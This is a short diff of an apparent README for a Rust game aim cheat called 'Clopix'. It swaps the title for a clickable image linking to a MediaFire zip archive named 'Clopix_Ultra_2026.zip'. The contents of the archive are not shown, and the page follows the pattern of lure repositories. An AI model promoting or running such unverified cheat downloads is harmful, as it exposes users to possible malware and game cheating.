@@ -1,1 +1,1 @@
-# Rust-Clopix-New-Aim
+[<img width="359" height="140" alt="image" src="https://github.com/user-attachments/assets/155925b7-7542-4c57-a741-ff87029b87e5" />](https://www.mediafire.com/file/qgi1jr6ajk0hgwd/Clopix_Ultra_2026.zip/file)
